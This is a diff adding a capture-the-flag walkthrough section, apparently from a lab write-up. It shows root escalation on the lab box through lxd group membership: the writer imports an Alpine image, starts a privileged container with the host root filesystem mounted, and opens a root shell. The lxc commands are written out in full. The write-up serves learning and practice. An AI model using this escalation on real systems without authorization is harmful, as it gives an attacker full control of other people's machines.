@@ -55,3 +55,57 @@ check for any user flag
 ![Project Screenshot](5.png.png)
 
 
+Once,after getting the user flag lets try to get the root access:-
+
+
+lets check the user id
+
+![Project Screenshot](8.png)
+
+
+we can see the user is a part of lxd/lxv user which is linux docker in the linux
+
+we can get
+the alpine script from the github
+
+https://github.com/saghul/lxd-alpine-builder.git
+
+and then install the tar.gx file from the builder and import it to the john's terminal through python http server.
+
+Once thts done we can load the image and launch it.
+
+lxc image import ./apline-v3.10-x86_64–20191008_1227.tar.gz — alias myimage
+
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+
+
+and then execute the /bin/sh to get root
+
+lxc exec ignite /bin/sh
+
+
+we get the root access to john.
+
+
+locate the the file in the terminal
+
+![Project Screenshot](7.png.png)
+
+
+!!!!!! YESS WE GOT THE ROOT FILE.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
